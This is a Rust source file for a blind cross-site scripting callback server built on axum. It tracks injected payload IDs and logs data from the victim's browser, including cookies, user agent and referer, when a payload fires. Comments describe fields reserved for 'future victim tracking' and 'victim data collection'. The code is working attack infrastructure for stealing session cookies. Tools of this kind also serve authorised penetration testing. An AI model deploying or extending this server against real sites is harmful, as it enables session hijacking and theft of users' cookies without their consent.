use axum::{
    extract::{Path, State},
    http::{HeaderMap, StatusCode},
    routing::get,
    Router,
};
use chrono::{DateTime, Utc};
use std::collections::HashMap;
use std::net::SocketAddr;
use std::sync::Arc;
use tokio::sync::Mutex;
use uuid::Uuid;

#[derive(Debug, Clone)]
#[allow(dead_code)] // Fields reserved for future victim tracking features
pub struct PayloadContext {
    pub id: String,
    pub url: url::Url,
    pub parameter: String,
    pub timestamp: DateTime<Utc>,
    pub detected: bool,
}

#[derive(Debug, Clone)]
#[allow(dead_code)] // Fields reserved for future victim data collection
pub struct VictimData {
    pub user_agent: Option<String>,
    pub cookies: Option<String>,
    pub referer: Option<String>,
    pub ip: Option<String>,
}

pub type PayloadTracker = Arc<Mutex<HashMap<String, PayloadContext>>>;

pub async fn start_callback_server(
    port: u16,
    tracker: PayloadTracker,
) -> Result<(), Box<dyn std::error::Error>> {
    let app = Router::new()
        .route("/xss/:payload_id", get(handle_callback))
        .with_state(tracker);

    let addr = SocketAddr::from(([127, 0, 0, 1], port));

    println!("[*] Blind XSS callback server started on http://{}", addr);

    let listener = tokio::net::TcpListener::bind(addr).await?;
    axum::serve(listener, app).await?;

    Ok(())
}

async fn handle_callback(
    Path(payload_id): Path<String>,
    State(tracker): State<PayloadTracker>,
    headers: HeaderMap,
) -> StatusCode {
    println!("[+] Callback received for payload: {}", payload_id);

    // Extract victim data from headers
    let victim_data = VictimData {
        user_agent: headers
            .get("user-agent")
            .and_then(|v| v.to_str().ok())
            .map(|s| s.to_string()),
        cookies: headers
            .get("cookie")
            .and_then(|v| v.to_str().ok())
            .map(|s| s.to_string()),
        referer: headers
            .get("referer")
            .and_then(|v| v.to_str().ok())
            .map(|s| s.to_string()),
        ip: None, // Would need to extract from X-Forwarded-For or connection
    };

    println!("  User-Agent: {:?}", victim_data.user_agent);
    println!("  Cookies: {:?}", victim_data.cookies);
    println!("  Referer: {:?}", victim_data.referer);

    // Mark payload as detected
    let mut tracker = tracker.lock().await;
    if let Some(context) = tracker.get_mut(&payload_id) {
        context.detected = true;
        println!("  [✓] Marked payload {} as detected", payload_id);
    } else {
        println!("  [!] Unknown payload ID: {}", payload_id);
    }

    StatusCode::OK
}

pub fn generate_payload_id() -> String {
    Uuid::new_v4().to_string()
}
